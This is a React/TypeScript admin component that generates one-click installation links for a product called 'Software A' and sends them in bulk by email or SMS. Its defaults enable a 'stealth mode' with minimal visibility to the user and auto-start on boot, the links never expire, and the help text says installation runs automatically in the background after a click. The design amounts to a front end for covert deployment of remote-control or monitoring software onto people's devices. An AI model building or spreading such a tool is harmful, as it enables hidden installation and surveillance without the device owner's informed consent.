/**
 * Installation Link Generator Component
 * Admin interface for creating and managing one-click installation links
 */

import React, { useState } from 'react';

interface InstallLinkGeneratorProps {
  organizationId: string;
  adminEmail: string;
}

export const InstallLinkGenerator: React.FC<InstallLinkGeneratorProps> = ({
  organizationId,
  adminEmail,
}) => {
  const [deviceName, setDeviceName] = useState('');
  const [groupId, setGroupId] = useState('');
  // No expiry — access is controlled by admin on/off in Software A Control
  const [maxUses, setMaxUses] = useState(1);
  const [autoStart, setAutoStart] = useState(true);
  const [stealthMode, setStealthMode] = useState(true);
  const [bulkCount, setBulkCount] = useState(1);
  const [distributionMethod, setDistributionMethod] = useState<'link' | 'email' | 'sms'>('link');
  const [recipients, setRecipients] = useState('');
  const [generatedLinks, setGeneratedLinks] = useState<any[]>([]);
  const [isGenerating, setIsGenerating] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);

  const [copyToast, setCopyToast] = useState('');

  const genId = () => Math.random().toString(36).slice(2, 10).toUpperCase();

  const makeLink = (index: number) => {
    const token = genId();
    const id = `lnk-${token}`;
    const base = 'https://get.bixtx.com/install/software-a';
    const params = new URLSearchParams({
      org: organizationId,
      token,
      admin: adminEmail,
      ...(deviceName ? { device: deviceName } : {}),
      ...(groupId ? { group: groupId } : {}),
      auto: autoStart ? '1' : '0',
      stealth: stealthMode ? '1' : '0',
    });
    const url = `${base}?${params.toString()}`;
    const shortUrl = `https://lwrx.ai/i/${token}`;
    return { id, token, url, shortUrl, maxUses, deviceName: deviceName || `Device ${index + 1}`, qrCodeUrl: '' };
  };

  const handleGenerateLinks = async () => {
    setIsGenerating(true);
    setShowSuccess(false);
    await new Promise(r => setTimeout(r, 600));
    const count = Math.max(1, Math.min(bulkCount, 100));
    const links = Array.from({ length: count }, (_, i) => makeLink(i));
    setGeneratedLinks(links);
    if (distributionMethod !== 'link' && recipients.trim()) {
      const recipientList = recipients.split('\n').filter(r => r.trim());
      console.info(`[bixtx.com] Distributing ${links.length} link(s) to ${recipientList.length} recipient(s) via ${distributionMethod}`);
    }
    setShowSuccess(true);
    setIsGenerating(false);
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text).catch(() => {});
    setCopyToast('Copied!');
    setTimeout(() => setCopyToast(''), 1800);
  };

  const downloadQRCode = (_url: string, linkId: string) => {
    const a = document.createElement('a');
    a.href = `data:text/plain,${linkId}`;
    a.download = `bixtx-install-link-${linkId}.txt`;
    a.click();
  };

  return (
    <div className="max-w-4xl mx-auto p-6">
      {copyToast && (
        <div className="fixed top-4 right-4 z-50 bg-green-600 text-white px-4 py-2 rounded-xl shadow-lg text-sm font-semibold">
          ✓ {copyToast}
        </div>
      )}
      <div className="bg-white rounded-lg shadow-lg overflow-hidden">
        {/* Header */}
        <div className="bg-gradient-to-r from-purple-600 to-indigo-600 p-6 text-white">
          <h2 className="text-3xl font-bold mb-2">🚀 Quick Install Link Generator</h2>
          <p className="text-purple-100">
            Generate one-click installation links for easy deployment
          </p>
        </div>

        {/* Configuration Form */}
        <div className="p-6 space-y-6">
          {/* Basic Settings */}
          <div>
            <h3 className="text-lg font-semibold mb-4">Basic Settings</h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Device Name (Optional)
                </label>
                <input
                  type="text"
                  value={deviceName}
                  onChange={(e) => setDeviceName(e.target.value)}
                  placeholder="e.g., John's Laptop"
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Group (Optional)
                </label>
                <select
                  value={groupId}
                  onChange={(e) => setGroupId(e.target.value)}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                >
                  <option value="">No Group</option>
                  <option value="group1">Sales Team</option>
                  <option value="group2">Marketing Team</option>
                  <option value="group3">Engineering Team</option>
                </select>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Access Control
                </label>
                <div className="px-4 py-2.5 border border-blue-200 rounded-lg bg-blue-50 text-sm text-blue-800 font-medium">
                  🔒 Admin Controlled (No Expiry)
                </div>
                <p className="text-xs text-gray-500 mt-1">Managed in Software A Control — admin on/off at any time</p>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Maximum Uses
                </label>
                <input
                  type="number"
                  value={maxUses}
                  onChange={(e) => setMaxUses(parseInt(e.target.value))}
                  min="1"
                  max="100"
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                />
              </div>
            </div>
          </div>

          {/* Advanced Settings */}
          <div>
            <h3 className="text-lg font-semibold mb-4">Advanced Settings</h3>
            <div className="space-y-3">
              <label className="flex items-center space-x-3 cursor-pointer">
                <input
                  type="checkbox"
                  checked={autoStart}
                  onChange={(e) => setAutoStart(e.target.checked)}
                  className="w-5 h-5 text-purple-600 rounded focus:ring-purple-500"
                />
                <span className="text-sm text-gray-700">
                  <strong>Auto-start on system boot</strong> - Software starts automatically
                </span>
              </label>

              <label className="flex items-center space-x-3 cursor-pointer">
                <input
                  type="checkbox"
                  checked={stealthMode}
                  onChange={(e) => setStealthMode(e.target.checked)}
                  className="w-5 h-5 text-purple-600 rounded focus:ring-purple-500"
                />
                <span className="text-sm text-gray-700">
                  <strong>Stealth mode</strong> - Minimal visibility to user
                </span>
              </label>
            </div>
          </div>

          {/* Bulk Generation */}
          <div>
            <h3 className="text-lg font-semibold mb-4">Bulk Generation</h3>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Number of Links to Generate
              </label>
              <input
                type="number"
                value={bulkCount}
                onChange={(e) => setBulkCount(parseInt(e.target.value))}
                min="1"
                max="100"
                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
              />
              {bulkCount > 1 && (
                <p className="mt-2 text-sm text-gray-600">
                  Each link will be unique and can be distributed separately
                </p>
              )}
            </div>
          </div>

          {/* Distribution Method */}
          <div>
            <h3 className="text-lg font-semibold mb-4">Distribution Method</h3>
            <div className="flex space-x-4 mb-4">
              <button
                onClick={() => setDistributionMethod('link')}
                className={`px-4 py-2 rounded-lg font-medium ${
                  distributionMethod === 'link'
                    ? 'bg-purple-600 text-white'
                    : 'bg-gray-200 text-gray-700'
                }`}
              >
                🔗 Copy Links
              </button>
              <button
                onClick={() => setDistributionMethod('email')}
                className={`px-4 py-2 rounded-lg font-medium ${
                  distributionMethod === 'email'
                    ? 'bg-purple-600 text-white'
                    : 'bg-gray-200 text-gray-700'
                }`}
              >
                📧 Email
              </button>
              <button
                onClick={() => setDistributionMethod('sms')}
                className={`px-4 py-2 rounded-lg font-medium ${
                  distributionMethod === 'sms'
                    ? 'bg-purple-600 text-white'
                    : 'bg-gray-200 text-gray-700'
                }`}
              >
                💬 SMS
              </button>
            </div>

            {distributionMethod !== 'link' && (
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  {distributionMethod === 'email' ? 'Email Addresses' : 'Phone Numbers'} (one per line)
                </label>
                <textarea
                  value={recipients}
                  onChange={(e) => setRecipients(e.target.value)}
                  placeholder={
                    distributionMethod === 'email'
                      ? 'john@example.com\njane@example.com'
                      : '+1234567890\n+0987654321'
                  }
                  rows={5}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                />
              </div>
            )}
          </div>

          {/* Generate Button */}
          <button
            onClick={handleGenerateLinks}
            disabled={isGenerating}
            className="w-full bg-gradient-to-r from-purple-600 to-indigo-600 text-white py-4 rounded-lg font-bold text-lg hover:from-purple-700 hover:to-indigo-700 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {isGenerating ? (
              <>⏳ Generating...</>
            ) : (
              <>🚀 Generate Installation {bulkCount > 1 ? 'Links' : 'Link'}</>
            )}
          </button>

          {/* Success Message */}
          {showSuccess && (
            <div className="bg-green-50 border border-green-200 rounded-lg p-4">
              <div className="flex items-start">
                <span className="text-2xl mr-3">✅</span>
                <div>
                  <h4 className="font-semibold text-green-900 mb-1">
                    Links Generated Successfully!
                  </h4>
                  <p className="text-sm text-green-700">
                    {generatedLinks.length} installation {generatedLinks.length > 1 ? 'links have' : 'link has'} been created
                    {distributionMethod !== 'link' && ' and distributed'}.
                  </p>
                </div>
              </div>
            </div>
          )}

          {/* Generated Links */}
          {generatedLinks.length > 0 && (
            <div className="border-t pt-6">
              <h3 className="text-lg font-semibold mb-4">
                Generated Installation Links
              </h3>
              <div className="space-y-4">
                {generatedLinks.map((link, index) => (
                  <div key={link.id} className="bg-gray-50 rounded-lg p-4">
                    <div className="flex items-start justify-between mb-3">
                      <div className="flex-1">
                        <h4 className="font-medium text-gray-900 mb-1">
                          Link #{index + 1}
                          {link.deviceName && ` - ${link.deviceName}`}
                        </h4>
                        <p className="text-xs text-gray-500">
                          Admin Controlled (No Expiry) | Uses: 0/{link.maxUses}
                        </p>
                      </div>
                      <span className="px-3 py-1 bg-green-100 text-green-800 text-xs font-medium rounded-full">
                        Active
                      </span>
                    </div>

                    <div className="space-y-3">
                      <div>
                        <label className="block text-xs font-medium text-gray-700 mb-1">
                          Installation URL
                        </label>
                        <div className="flex items-center space-x-2">
                          <input
                            type="text"
                            value={link.url}
                            readOnly
                            className="flex-1 px-3 py-2 text-sm bg-white border border-gray-300 rounded"
                          />
                          <button
                            onClick={() => copyToClipboard(link.url)}
                            className="px-4 py-2 bg-purple-600 text-white text-sm rounded hover:bg-purple-700"
                          >
                            Copy
                          </button>
                        </div>
                      </div>

                      <div>
                        <label className="block text-xs font-medium text-gray-700 mb-1">
                          Short URL
                        </label>
                        <div className="flex items-center space-x-2">
                          <input
                            type="text"
                            value={link.shortUrl}
                            readOnly
                            className="flex-1 px-3 py-2 text-sm bg-white border border-gray-300 rounded"
                          />
                          <button
                            onClick={() => copyToClipboard(link.shortUrl)}
                            className="px-4 py-2 bg-purple-600 text-white text-sm rounded hover:bg-purple-700"
                          >
                            Copy
                          </button>
                        </div>
                      </div>

                      <div className="flex items-center space-x-4">
                        <div className="w-24 h-24 border-2 border-dashed border-purple-300 rounded-lg flex items-center justify-center bg-purple-50 flex-shrink-0">
                          <div className="text-center">
                            <div className="text-2xl mb-0.5">📱</div>
                            <div className="text-[10px] text-purple-600 font-mono">{link.token}</div>
                          </div>
                        </div>
                        <div className="flex-1">
                          <p className="text-xs text-gray-600 mb-2">
                            Share the short URL or token — use QR Code Manager for scannable QR codes
                          </p>
                          <button
                            onClick={() => downloadQRCode(link.qrCodeUrl, link.id)}
                            className="px-3 py-1 bg-gray-200 text-gray-700 text-sm rounded hover:bg-gray-300"
                          >
                            Download Token
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Info Panel */}
      <div className="mt-6 bg-blue-50 border border-blue-200 rounded-lg p-6">
        <h3 className="font-semibold text-blue-900 mb-3">
          How It Works
        </h3>
        <ol className="space-y-2 text-sm text-blue-800">
          <li className="flex items-start">
            <span className="font-bold mr-2">1.</span>
            <span>Generate installation link(s) using the form above</span>
          </li>
          <li className="flex items-start">
            <span className="font-bold mr-2">2.</span>
            <span>Share the link via email, SMS, or manually</span>
          </li>
          <li className="flex items-start">
            <span className="font-bold mr-2">3.</span>
            <span>User clicks the link on their device</span>
          </li>
          <li className="flex items-start">
            <span className="font-bold mr-2">4.</span>
            <span>Installation happens automatically in the background</span>
          </li>
          <li className="flex items-start">
            <span className="font-bold mr-2">5.</span>
            <span>Device appears in your dashboard within 30-60 seconds</span>
          </li>
        </ol>
      </div>
    </div>
  );
};
